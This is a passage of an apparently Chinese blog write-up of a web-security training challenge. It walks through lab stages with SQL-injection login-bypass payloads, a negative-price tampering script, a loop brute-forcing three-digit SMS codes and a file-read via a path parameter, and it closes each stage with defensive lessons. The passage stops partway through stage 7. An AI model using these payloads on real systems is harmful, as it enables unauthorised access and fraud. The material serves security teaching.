src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_4.png" alt="关卡1"></p><h3 id="3-揭密"><a href="#3-揭密" class="headerlink" title="3. 揭密"></a>3. 揭密</h3><p>用户名密码直接写在了页面的js逻辑里，跟随页面元素js操作即可找到对应的内容。<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_5.png" alt="关卡1-页面代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_5.png" alt="关卡1-页面代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_5.png" alt="关卡1-页面代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_5.png" alt="关卡1-页面代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_6.png" alt="关卡1-js代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_6.png" alt="关卡1-js代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_6.png" alt="关卡1-js代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_6.png" alt="关卡1-js代码"></p><p>由此，可见第一关的用户名密码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> stage1Username = <span class="string">&quot;stage1_user&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> state1Password = <span class="string">&quot;tHis1Is3aSim3p#ab$&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="4-小结"><a href="#4-小结" class="headerlink" title="4. 小结"></a>4. 小结</h3><p>一般不会出现此类小白程序员的情况。</p><h2 id="0x02-关卡2"><a href="#0x02-关卡2" class="headerlink" title="0x02 关卡2"></a>0x02 关卡2</h2><p>这是一道SQL注入题。</p><p>SQL注入攻击（SQL Injection），简称注入攻击，是Web开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。</p><h3 id="1-提示-1"><a href="#1-提示-1" class="headerlink" title="1. 提示"></a>1. 提示</h3><p>提示如下：</p><blockquote><p>任务目标：本题没有可登入的用户名密码，请绕过登录验证。<br>Tips：就算是判断了用户名 and 密码 都正确，也是被禁用的。</p></blockquote><h3 id="2-界面-1"><a href="#2-界面-1" class="headerlink" title="2. 界面"></a>2. 界面</h3><p>界面如下图所示：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_7.png" alt="关卡2"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_7.png" alt="关卡2"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_7.png" alt="关卡2"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_7.png" alt="关卡2"></p><h3 id="3-揭密-1"><a href="#3-揭密-1" class="headerlink" title="3. 揭密"></a>3. 揭密</h3><p>对于sql而言，有些特殊字符（如：单引号，–，\，#等）、保留字（如：select，values，delete等）和内置函数（date，time，concat等），使用不当都有可能会导致SQL执行错误。</p><p>由此，我们尝试使用单引号，发现登录异常提示如下：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_12.png" alt="特殊字符注入"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_12.png" alt="特殊字符注入"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_12.png" alt="特殊字符注入"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_12.png" alt="特殊字符注入"></p><p>并且，发现在控制台出现如下异常信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StatementCallback; bad SQL grammar [select count(id) from user2 <span class="built_in">where</span> username = <span class="string">&#x27;&#x27;</span><span class="string">&#x27; and password = &#x27;</span><span class="string">&#x27;]; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27; and password = &#x27;</span><span class="string">&#x27;&#x27;</span> at line 1</span><br></pre></td></tr></table></figure><p>从异常内容可以发现，出错的SQL内容为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(id) <span class="keyword">from</span> user2 <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;&#x27;&#x27; and password = &#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>于是乎就从盲目地注入，变成了有针对性的注入。<br>针对于此，可以填写如下内容进入SQL注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">username: \</span><br><span class="line">password: <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username: \</span></span><br><span class="line"><span class="string">password: or 1 != &#x27;</span></span><br><span class="line"></span><br><span class="line">username: <span class="string">&#x27; or 1 !=</span></span><br><span class="line"><span class="string">password: &#x27;</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">username: <span class="string">&#x27; or 1 !=</span></span><br><span class="line"><span class="string">password: &#x27;</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">username: <span class="string">&#x27; or 1=1 -- x</span></span><br><span class="line"><span class="string">username: &#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #</span><br></pre></td></tr></table></figure><p><strong>注</strong>：答案可以很多。</p><h3 id="4-小结-1"><a href="#4-小结-1" class="headerlink" title="4. 小结"></a>4. 小结</h3><ul><li>避免出现一些详细的错误消息，异常不要抛出来，在服务器端打印日志用于异常分析就好。</li><li>永远不要使用动态拼装sql，使用数据库或开发框架提供的参数化查询接口。</li><li>机密信息不要直接存放，加密或者hash密码和敏感的信息再存储。</li><li>用户输入过滤：对特殊字符单引号和双”-“等进行转义处理或编码转换。</li><li>SQL注入检测工具进行检测。如：sqlmap、SQLninja等。</li></ul><h3 id="5-参考文档"><a href="#5-参考文档" class="headerlink" title="5. 参考文档"></a>5. 参考文档</h3><ul><li><a href="http://php.net/manual/zh/security.database.sql-injection.php">SQL 注入</a></li><li><a href="http://baike.baidu.com/view/3896.htm#3">SQL注入技术</a></li><li><a href="https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md">9.4 避免SQL注入</a></li></ul><h2 id="0x03-关卡3"><a href="#0x03-关卡3" class="headerlink" title="0x03 关卡3"></a>0x03 关卡3</h2><h3 id="1-提示-2"><a href="#1-提示-2" class="headerlink" title="1. 提示"></a>1. 提示</h3><p>提示如下：</p><blockquote><p>任务目标：找到通关后台，并将自己的通关数目加一级<br>Tips：答案不在本页</p></blockquote><h3 id="2-界面-2"><a href="#2-界面-2" class="headerlink" title="2. 界面"></a>2. 界面</h3><p>界面如下图所示：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_13.png" alt="关卡3"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_13.png" alt="关卡3"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_13.png" alt="关卡3"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_13.png" alt="关卡3"></p><h3 id="3-揭密-2"><a href="#3-揭密-2" class="headerlink" title="3. 揭密"></a>3. 揭密</h3><p>由提示找到通关后台可知，找到后台是关键。<br>一般地，常规后台命名为admin、admin\index、manage、dashboard等。</p><p>尝试如下地址：<a href="http://localhost:8080/sohu/index#/admin">http://localhost:8080/sohu/index#/admin</a><br>于是进入了后台管理界面，如下图所示：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_15.png" alt="WEB安全渗透实战-后台管理系统"><br>](<a href="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_15.png">http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB安全渗透分享/Snip20160308_15.png</a>)<br>](<a href="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_15.png">http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB安全渗透分享/Snip20160308_15.png</a>)<br>](<a href="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_15.png">http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB安全渗透分享/Snip20160308_15.png</a>)<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_16.png" alt="后台管理系统-升级"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_16.png" alt="后台管理系统-升级"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_16.png" alt="后台管理系统-升级"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_16.png" alt="后台管理系统-升级"></p><p>尝试点击<strong>升级</strong>直接通关，其他所有内容其实都是假的。</p><h3 id="4-小结-2"><a href="#4-小结-2" class="headerlink" title="4. 小结"></a>4. 小结</h3><p>后台弱口令</p><h2 id="0x04-关卡4"><a href="#0x04-关卡4" class="headerlink" title="0x04 关卡4"></a>0x04 关卡4</h2><p>将非最高价格物品价格修改为负值，从而增加自己的虚拟货币，然后再买最高价格物品。</p><h3 id="1-提示-3"><a href="#1-提示-3" class="headerlink" title="1. 提示"></a>1. 提示</h3><p>提示如下：</p><blockquote><p>任务目标：通过本页面提供的虚拟货币购买价值最高的物品<br>Tips：0 - (-1) = 1</p></blockquote><h3 id="2-界面-3"><a href="#2-界面-3" class="headerlink" title="2. 界面"></a>2. 界面</h3><p>界面如下图所示：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_21.png" alt="关卡4"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_21.png" alt="关卡4"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_21.png" alt="关卡4"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_21.png" alt="关卡4"></p><h3 id="3-揭密-3"><a href="#3-揭密-3" class="headerlink" title="3. 揭密"></a>3. 揭密</h3><p>由于初始时每人只拥有5000000的虚拟货币，完全不只以购买价值最高的物品。<br>因为要购买前需要增加自己的虚拟货币。</p><p>再根据下面的提示说0 - (-1) = 1，可与购买联想到：购买物品时，修改传到后端的价格为负数，来达到为自己增加虚拟货币的目的。</p><p>于是我们尝试购买价格为399的物品。系统提示：购买成功，但是未购买价值最高的物品，如下图所示：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_22.png" alt="未购买最高价值的物品"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_22.png" alt="未购买最高价值的物品"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_22.png" alt="未购买最高价值的物品"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_22.png" alt="未购买最高价值的物品"></p><p>我们再通过console可以看到，发出的POST请求为：<a href="http://10.4.236.115:8080/sohu/stage4/pass?id=1&amp;price=399">http://10.4.236.115:8080/sohu/stage4/pass?id=1&amp;price=399</a></p><p>查看购买的js请求代码如下：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_23.png" alt="关卡4-js代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_23.png" alt="关卡4-js代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_23.png" alt="关卡4-js代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_23.png" alt="关卡4-js代码"></p><p>在下一次购买请求时，设置price值为 -7999999 。请求完成后，依然提示购买失败的消息，但是虚拟货币却变成了：12999600。</p><p>于是，我们就可以开开心心地购买最高价格的物品了。</p><p>完成的js操作如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 增加虚拟货币</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://10.4.236.115:8080/sohu/stage4/pass?id=1&amp;price=-7999999&#x27;</span>;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">    <span class="attr">async</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">url</span>: url,</span><br><span class="line">    <span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (data.status == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;SUCCESS&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 购买最高价格物品</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://10.4.236.115:8080/sohu/stage4/pass?id=3&amp;price=7999999&#x27;</span>;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">    <span class="attr">async</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">url</span>: url,</span><br><span class="line">    <span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (data.status == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;SUCCESS&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="4-小结-3"><a href="#4-小结-3" class="headerlink" title="4. 小结"></a>4. 小结</h3><p>虽然做了不能够买比自己持有总金额高的物品的检验，但是未校验物品金额不允许为负数，也未校验id对应的物品金额与实际金额是否相符。<br>对于关键逻辑，对参数做更加严格的校验。</p><h2 id="0x05-关卡5"><a href="#0x05-关卡5" class="headerlink" title="0x05 关卡5"></a>0x05 关卡5</h2><p>暴力破解</p><h3 id="1-提示-4"><a href="#1-提示-4" class="headerlink" title="1. 提示"></a>1. 提示</h3><p>提示如下：</p><blockquote><p>任务目标：通过收到的短信验证码完成手机验证。<br>Tips：有时候采用最原始的方法收到的效果反而更显著。</p></blockquote><h3 id="2-界面-4"><a href="#2-界面-4" class="headerlink" title="2. 界面"></a>2. 界面</h3><p>界面如下图所示：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_24.png" alt="关卡5"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_24.png" alt="关卡5"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_24.png" alt="关卡5"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_24.png" alt="关卡5"></p><h3 id="3-揭密-4"><a href="#3-揭密-4" class="headerlink" title="3. 揭密"></a>3. 揭密</h3><p>从Tips里提到的最原始的方法，大概能猜测到最直接的破解方式：<strong>字典破解</strong> 或 <strong>暴力破解</strong>。<br>要么验证码是个弱密码，要么验证码很方便枚举出来。</p><p>接下来，点击“获取短信验证码”，提示：新的3位数字验证码已经通过短信，发送到13800138000的手机上，请注意查收！<br>因此，可见验证码可以枚举出来，只需要发起不超过1000次请求即可找到验证码。</p><p>看过js请求代码，了解请求构造后，可以使用如下操作暴破：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://10.4.236.115:8080/sohu/sms/code/verfiy&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> len = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line"><span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="attr">async</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">url</span>: url + <span class="string">&#x27;?phone=13800138000&amp;code=&#x27;</span> + i,</span><br><span class="line"><span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (data.status == <span class="number">200</span>) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;code:&#x27;</span> + i);</span><br><span class="line">i = len;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>暴破完成后，会打印出对应的验证码，之后即可通过dashboard页直接进入下一关。</p><p><strong>注</strong>：考虑验证码可能会补扩散开，因此每次有人过关，验证码就会重新刷新一次。</p><h3 id="4-小结-4"><a href="#4-小结-4" class="headerlink" title="4. 小结"></a>4. 小结</h3><p>尽量不要设置容易枚举的密码或验证码。同时，对于敏感信息可以加上一些限制，类似于：时效性限制或者一天内允许尝试失败次数等。</p><h2 id="0x06-关卡6"><a href="#0x06-关卡6" class="headerlink" title="0x06 关卡6"></a>0x06 关卡6</h2><p>读取服务器上的文件</p><h3 id="1-提示-5"><a href="#1-提示-5" class="headerlink" title="1. 提示"></a>1. 提示</h3><p>提示如下：</p><blockquote><p>任务目标：找到可以通过本关的密码并提交。<br>Tips：密码被硬编码到了当前页面服务器上的php代码里。</p></blockquote><h3 id="2-界面-5"><a href="#2-界面-5" class="headerlink" title="2. 界面"></a>2. 界面</h3><p>界面如下图所示：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_25.png" alt="关卡6"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_25.png" alt="关卡6"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_25.png" alt="关卡6"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_25.png" alt="关卡6"></p><h3 id="3-揭密-5"><a href="#3-揭密-5" class="headerlink" title="3. 揭密"></a>3. 揭密</h3><p>老规范，查看页面代码，如下图所示：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_27.png" alt="关卡6-页面代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_27.png" alt="关卡6-页面代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_27.png" alt="关卡6-页面代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_27.png" alt="关卡6-页面代码"></p><p>再结合Tips说密码被放在了php代码里。巧的是页面里的图片也是通过后缀为php的url生成的。<br>由此可知，这个php页面就是stage6.php。如此同时，这个服务还支持file参数。</p><p>于是，可以尝试设file值为../stage6.php、stage6.php、sohu/stage6.php、../sohu/stage6.php等等获取php代码内容。</p><p>最后发现该php代码文件获取链接地址为：<a href="http://10.4.236.115:8080/sohu/stage6.php?file=stage6.php">http://10.4.236.115:8080/sohu/stage6.php?file=stage6.php</a></p><p>查看页面内容如下图所示：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_28.png" alt="关卡6-php代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_28.png" alt="关卡6-php代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_28.png" alt="关卡6-php代码"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_28.png" alt="关卡6-php代码"></p><p>额，其实这是一个jsp页面，只是以jsp为后缀的url被jetty使用默认的servlet自动转发了，不得以只好用php做为后缀用了。</p><p>总之，最后能获取到了密码为：sATa3HGe6</p><h3 id="4-小结-5"><a href="#4-小结-5" class="headerlink" title="4. 小结"></a>4. 小结</h3><p>不要以实际文件路径为文件请求参数。<br>如果服务需要的文件可枚举，则可以在后端限制可获取文件范围；或者把所有需要的文件放置于一个特定目标，只允许访问通过服务获取此目标下的文件。</p><h2 id="0x07-关卡7"><a href="#0x07-关卡7" class="headerlink" title="0x07 关卡7"></a>0x07 关卡7</h2><p>伪造ip地址</p><h3 id="1-提示-6"><a href="#1-提示-6" class="headerlink" title="1. 提示"></a>1. 提示</h3><p>提示如下：</p><blockquote><p>任务目标：请获得本页面的访问权限<br>Tips：一会公开的来源控制方法也许并不安全</p></blockquote><h3 id="2-界面-6"><a href="#2-界面-6" class="headerlink" title="2. 界面"></a>2. 界面</h3><p>界面如下图所示：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_29.png" alt="关卡7"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_29.png" alt="关卡7"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_29.png" alt="关卡7"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_29.png" alt="关卡7"></p><h3 id="3-揭密-6"><a href="#3-揭密-6" class="headerlink" title="3. 揭密"></a>3. 揭密</h3><p>点击“验证权限”发现系统给出如下提示：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_30.png" alt="关卡7-提示"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_30.png" alt="关卡7-提示"><br><img 